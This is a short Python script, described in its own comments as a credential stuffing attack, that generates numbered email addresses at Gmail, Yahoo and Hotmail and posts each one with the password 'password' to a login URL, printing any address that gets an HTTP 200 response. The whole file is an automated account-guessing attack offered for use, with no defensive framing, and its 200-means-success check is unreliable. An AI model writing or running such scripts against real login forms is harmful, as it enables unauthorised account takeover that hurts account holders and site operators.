# The program I made is a credential stuffing attack against a login form. It generates random email addresses using common domains, and then tries to login with those email addresses and a static password. If the login is successful, it prints out the email address that was used.
# code not properly tested for obvious reasons

import requests

# Declare list of email domains to check
email_domains = ["gmail.com", "yahoo.com", "hotmail.com"]

# Set target URL
target_url = "http://example.com/login"

# Credential stuffing attack
for domain in email_domains:
    for i in range(10000):
        # Generate random email address
        email = f"{i}@{domain}"

        # Set payload
        payload = {"email": email, "password": "password"}

        # Send POST request
        r = requests.post(target_url, data=payload)

        # Check response
        if r.status_code == 200:
            print(f"Successful login with email {email}")
            break
